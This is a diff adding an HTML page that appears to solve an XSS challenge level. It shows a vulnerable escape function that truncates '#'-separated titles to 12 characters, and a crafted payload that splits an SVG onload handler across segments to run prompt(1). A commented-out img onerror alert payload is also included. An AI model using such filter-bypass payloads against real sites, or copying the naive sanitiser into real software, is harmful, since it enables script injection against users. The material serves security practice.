@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+</head>
+
+<body>
+    <title></title>
+    <h1></h1>
+    <div id="body">
+        <!-- <p class="comment" title=""><svg/a="></p>
+        <p class="comment" title=""onload='/*"></p>
+        <p class="comment" title="*/prompt(1)'"></p> -->
+    </div>
+    <script>
+        function escape(input) {
+            // pass in something like dog#cat#bird#mouse...
+            var segments = input.split('#');
+            return segments.map(function (title) {
+                // 長度繞過
+                // title can only contain 12 characters
+                return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
+            }).join('\n');
+        }
+        // var input="<img src='#' style='display: none;' onerror=alert(/xss/); ";
+        var input = "\"><svg a=#\"onload='`#`;prompt(1)'";
+        var body = document.getElementById("body");
+        body.innerHTML = escape(input);
+    </script>
+</body>
+
+</html>
